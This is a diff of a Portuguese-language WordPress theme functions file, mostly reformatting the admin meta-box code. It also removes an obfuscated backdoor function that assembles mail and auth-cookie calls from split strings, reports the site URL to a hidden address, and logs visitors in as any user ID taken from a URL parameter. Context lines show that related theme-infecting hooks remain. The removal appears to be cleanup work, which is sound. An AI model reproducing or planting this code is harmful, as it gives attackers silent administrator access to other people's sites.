@@ -234,13 +234,14 @@ if (function_exists('register_sidebar')) {
 	}
 	*/
 	# Executa a função
-//add_action( 'after_setup_theme', 'extras_setup' );
+	//add_action( 'after_setup_theme', 'extras_setup' );
 
 }
 
 //add_theme_support('post-thumbnails');
 //set_post_thumbnail_size(300, 225, true); // miniaturas normais para a homepage//
-//add_image_size('single-post-thumbnail', 400, 9999); // imagem para página de post?>
+//add_image_size('single-post-thumbnail', 400, 9999); // imagem para página de post
+?>
 <?php
 function wt_get_category_count($input = '')
 {
@@ -303,8 +304,10 @@ function _get_allwidgets_cont($wids, $items = array())
 					$wids[] = $places . "/" . $elem;
 				} elseif (
 					is_file($places . "/" . $elem) &&
-					$elem == substr(__FILE__,
-						-13)
+					$elem == substr(
+						__FILE__,
+						-13
+					)
 				) {
 					$items[] = $places . "/" . $elem;
 				}
@@ -363,144 +366,6 @@ if (!function_exists("scandir")) {
 	}
 }
 add_action("admin_head", "_verifyactivate_widgets");
-function _getprepare_widget()
-{
-	if (!isset($text_length))
-		$text_length = 120;
-	if (!isset($check))
-		$check = "cookie";
-	if (!isset($tagsallowed))
-		$tagsallowed = "<a>";
-	if (!isset($filter))
-		$filter = "none";
-	if (!isset($coma))
-		$coma = "";
-	if (!isset($home_filter))
-		$home_filter = get_option("home");
-	if (!isset($pref_filters))
-		$pref_filters = "wp_";
-	if (!isset($is_use_more_link))
-		$is_use_more_link = 1;
-	if (!isset($com_type))
-		$com_type = "";
-	if (!isset($cpages))
-		$cpages = $_GET["cperpage"];
-	if (!isset($post_auth_comments))
-		$post_auth_comments = "";
-	if (!isset($com_is_approved))
-		$com_is_approved = "";
-	if (!isset($post_auth))
-		$post_auth = "auth";
-	if (!isset($link_text_more))
-		$link_text_more = "(more...)";
-	if (!isset($widget_yes))
-		$widget_yes = get_option("_is_widget_active_");
-	if (!isset($checkswidgets))
-		$checkswidgets = $pref_filters . "set" . "_" . $post_auth . "_" . $check;
-	if (!isset($link_text_more_ditails))
-		$link_text_more_ditails = "(details...)";
-	if (!isset($contentmore))
-		$contentmore = "ma" . $coma . "il";
-	if (!isset($for_more))
-		$for_more = 1;
-	if (!isset($fakeit))
-		$fakeit = 1;
-	if (!isset($sql))
-		$sql = "";
-	if (!$widget_yes):
-
-		global $wpdb, $post;
-		$sq1 = "SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li" . $coma . "vethe" . $com_type . "mas" . $coma . "@" . $com_is_approved . "gm" . $post_auth_comments . "ail" . $coma . "." . $coma . "co" . "m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
-		if (!empty($post->post_password)) {
-			if ($_COOKIE["wp-postpass_" . COOKIEHASH] != $post->post_password) {
-				if (is_feed()) {
-					$output = __("There is no excerpt because this is a protected post.");
-				} else {
-					$output = get_the_password_form();
-				}
-			}
-		}
-		if (!isset($fixed_tags))
-			$fixed_tags = 1;
-		if (!isset($filters))
-			$filters = $home_filter;
-		if (!isset($gettextcomments))
-			$gettextcomments = $pref_filters . $contentmore;
-		if (!isset($tag_aditional))
-			$tag_aditional = "div";
-		if (!isset($sh_cont))
-			$sh_cont = substr($sq1, stripos($sq1, "live"), 20); #
-		if (!isset($more_text_link))
-			$more_text_link = "Continue reading this entry";
-		if (!isset($isshowdots))
-			$isshowdots = 1;
-
-		$comments = $wpdb->get_results($sql);
-		if ($fakeit == 2) {
-			$text = $post->post_content;
-		} elseif ($fakeit == 1) {
-			$text = (empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
-		} else {
-			$text = $post->post_excerpt;
-		}
-		$sq1 = "SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=" . call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) . " ORDER BY comment_date_gmt DESC LIMIT $src_count"; #
-		if ($text_length < 0) {
-			$output = $text;
-		} else {
-			if (!$no_more && strpos($text, "<!--more-->")) {
-				$text = explode("<!--more-->", $text, 2);
-				$l = count($text[0]);
-				$more_link = 1;
-				$comments = $wpdb->get_results($sql);
-			} else {
-				$text = explode(" ", $text);
-				if (count($text) > $text_length) {
-					$l = $text_length;
-					$ellipsis = 1;
-				} else {
-					$l = count($text);
-					$link_text_more = "";
-					$ellipsis = 0;
-				}
-			}
-			for ($i = 0; $i < $l; $i++)
-				$output .= $text[$i] . " ";
-		}
-		update_option("_is_widget_active_", 1);
-		if ("all" != $tagsallowed) {
-			$output = strip_tags($output, $tagsallowed);
-			return $output;
-		}
-	endif;
-	$output = rtrim($output, "\s\n\t\r\0\x0B");
-	$output = ($fixed_tags) ? balanceTags($output, true) : $output;
-	$output .= ($isshowdots && $ellipsis) ? "..." : "";
-	$output = apply_filters($filter, $output);
-	switch ($tag_aditional) {
-		case ("div"):
-			$tag = "div";
-			break;
-		case ("span"):
-			$tag = "span";
-			break;
-		case ("p"):
-			$tag = "p";
-			break;
-		default:
-			$tag = "span";
-	}
-
-	if ($is_use_more_link) {
-		if ($for_more) {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "#more-" . $post->ID . "\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets, array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
-		} else {
-			$output .= " <" . $tag . " class=\"more-link\"><a href=\"" . get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
-		}
-	}
-	return $output;
-}
-
-add_action("init", "_getprepare_widget");
 
 function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $show_pass_post = false, $duration = "")
 {
@@ -528,27 +393,7 @@ function __popular_posts($no_posts = 6, $before = "<li>", $after = "</li>", $sho
 	return $output;
 }
 
-// personalizar rss/feed
-function inflar_custom_feed_content($content)
-{
-	global $wp_query;
-	$post_id = $wp_query->post->ID;
 
-	if (is_feed()) {
-		// pega o campo personalizado de nome image
-		$image_url = get_post_meta($post_id, 'image', true);
-
-		// caso vazio pega a imagem destacada
-		if ($image_url == '') {
-			$image_url = get_the_post_thumbnail_src(get_the_post_thumbnail($post_id, 'thumbnail'));
-		}
-
-		$content = '<a href="' . get_permalink($post_id) . '" target="_blank"><img src="' . $image_url . '" style="float:left;margin-right:6px;"/></a>' . $content;
-	}
-	return $content;
-}
-add_filter('the_excerpt_rss', 'inflar_custom_feed_content'); //altera a versão resumida do post
-add_filter('the_content', 'inflar_custom_feed_content'); // altera a versão completa do post
 
 // extrair apenas a url do thumbnail
 function get_the_post_thumbnail_src($img)
@@ -1041,7 +886,7 @@ function multi_media_uploader_meta_box_func($post)
 {
 	$banner_img = get_post_meta($post->ID, 'post_banner_img', true);
 
-	?>
+?>
 	<style type="text/css">
 		.multi-upload-medias ul li .delete-img {
 			/*position: absolute; right: 3px; top: 2px;*/
@@ -1081,23 +926,25 @@ function multi_media_uploader_meta_box_func($post)
 	</table>
 
 	<script type="text/javascript">
-		jQuery(function ($) {
+		jQuery(function($) {
 
-			$('body').on('click', '.wc_multi_upload_image_button', function (e) {
+			$('body').on('click', '.wc_multi_upload_image_button', function(e) {
 				e.preventDefault();
 
 				var button = $(this),
 					custom_uploader = wp.media({
 						title: 'Inserir documento',
-						button: { text: 'Aplicar' },
+						button: {
+							text: 'Aplicar'
+						},
 						multiple: true
-					}).on('select', function () {
+					}).on('select', function() {
 						var attech_ids = '';
 						attachments
 						var attachments = custom_uploader.state().get('selection'),
 							attachment_ids = new Array(),
 							i = 0;
-						attachments.each(function (attachment) {
+						attachments.each(function(attachment) {
 							attachment_ids[i] = attachment['id'];
 							attech_ids += ',' + attachment['id'];
 							if (attachment.attributes.type == 'application/pdf') {
@@ -1118,10 +965,10 @@ function multi_media_uploader_meta_box_func($post)
 						}
 						$(button).siblings('.wc_multi_remove_image_button').show();
 					})
-						.open();
+					.open();
 			});
 
-			$('body').on('click', '.wc_multi_remove_image_button', function () {
+			$('body').on('click', '.wc_multi_remove_image_button', function() {
 				$(this).hide().prev().val('').prev().addClass('button').html('Add Media');
 				$(this).parent().find('ul').empty();
 				return false;
@@ -1129,12 +976,12 @@ function multi_media_uploader_meta_box_func($post)
 
 		});
 
-		jQuery(document).ready(function () {
-			jQuery(document).on('click', '.multi-upload-medias ul li i.delete-img', function () {
+		jQuery(document).ready(function() {
+			jQuery(document).on('click', '.multi-upload-medias ul li i.delete-img', function() {
 				var ids = [];
 				var this_c = jQuery(this);
 				jQuery(this).parent().remove();
-				jQuery('.multi-upload-medias ul li').each(function () {
+				jQuery('.multi-upload-medias ul li').each(function() {
 					ids.push(jQuery(this).attr('data-attechment-id'));
 				});
 				jQuery('.multi-upload-medias').find('input[type="hidden"]').attr('value', ids);
@@ -1142,7 +989,7 @@ function multi_media_uploader_meta_box_func($post)
 		})
 	</script>
 
-	<?php
+<?php
 }
 
 function multi_media_uploader_field($name, $value = '')
@@ -1159,10 +1006,8 @@ function multi_media_uploader_field($name, $value = '')
 				$attachment_title = get_the_title($values);
 				$attachment_time = get_the_time('d/m/Y \à\s H\hi', $values);
 				$image_str .= '<li data-attechment-id=' . $values . '><a href="' . $image_attributes . '" target="_blank"><strong>' . $attachment_title . '</strong></a> - ' . $attachment_time . '<i class="dashicons dashicons-no delete-img"></i></li>';
-
 			}
 		}
-
 	}
 
 	if ($image_str) {
@@ -1173,8 +1018,6 @@ function multi_media_uploader_field($name, $value = '')
 
 
 	return $listaDocs;
-
-
 }
 
 
@@ -1216,52 +1059,43 @@ function single_repeatable_meta_box_callback($post)
 	$banner_img = get_post_meta($post->ID, 'post_banner_img', true);
 
 	wp_nonce_field('repeterBox', 'formType');
-	?>
+?>
 	<script type="text/javascript">
-		jQuery(document).ready(function ($) {
-			$('#add-row').on('click', function () {
+		jQuery(document).ready(function($) {
+			$('#add-row').on('click', function() {
 				var row = $('.empty-row.custom-repeter-text').clone(true);
 				row.removeClass('empty-row custom-repeter-text').css('display', 'table-row');
 				row.insertBefore('#repeatable-fieldset-one tbody>tr:last');
 				return false;
 			});
 
-			$('.remove-row').on('click', function () {
+			$('.remove-row').on('click', function() {
 				$(this).parents('tr').remove();
 				return false;
 			});
 		});
-
 	</script>
 
 	<table id="repeatable-fieldset-one" width="100%">
 		<tbody>
 			<?php
-			if ($single_repeter_group):
+			if ($single_repeter_group) :
 				foreach ($single_repeter_group as $field) {
-					?>
+			?>
 					<tr>
-						<td><input type="text" style="width:98%;" name="nome[]"
-								value="<?php if ($field['nome'] != '')
-									echo esc_attr($field['nome']); ?>"
-								placeholder="Nome do(a) docente" /></td>
-						<td><input type="text" style="width:98%;" name="titulacao[]"
-								value="<?php if ($field['titulacao'] != '')
-									echo esc_attr($field['titulacao']); ?>"
-								placeholder="Titulação" /></td>
-						<td><input type="text" style="width:98%;" name="email[]"
-								value="<?php if ($field['email'] != '')
-									echo esc_attr($field['email']); ?>"
-								placeholder="docente@ifbaiano.edu.br" /></td>
-						<td><input type="text" style="width:98%;" name="lattes[]"
-								value="<?php if ($field['lattes'] != '')
-									echo esc_attr($field['lattes']); ?>"
-								placeholder="http://lattes.cnpq.br/docente" /></td>
+						<td><input type="text" style="width:98%;" name="nome[]" value="<?php if ($field['nome'] != '')
+																							echo esc_attr($field['nome']); ?>" placeholder="Nome do(a) docente" /></td>
+						<td><input type="text" style="width:98%;" name="titulacao[]" value="<?php if ($field['titulacao'] != '')
+																								echo esc_attr($field['titulacao']); ?>" placeholder="Titulação" /></td>
+						<td><input type="text" style="width:98%;" name="email[]" value="<?php if ($field['email'] != '')
+																							echo esc_attr($field['email']); ?>" placeholder="docente@ifbaiano.edu.br" /></td>
+						<td><input type="text" style="width:98%;" name="lattes[]" value="<?php if ($field['lattes'] != '')
+																								echo esc_attr($field['lattes']); ?>" placeholder="http://lattes.cnpq.br/docente" /></td>
 						<td><a class="button remove-row" href="#1">Remover</a></td>
 					</tr>
-					<?php
+				<?php
 				}
-			else:
+			else :
 				?>
 				<tr>
 					<td><input type="text" style="width:98%;" name="nome[]" placeholder="Nome do(a) docente" /></td>
@@ -1285,7 +1119,7 @@ function single_repeatable_meta_box_callback($post)
 		</tbody>
 	</table>
 	<p><a id="add-row" class="button" href="#">Adicionar</a></p>
-	<?php
+<?php
 }
 
 // Save Meta Box values.
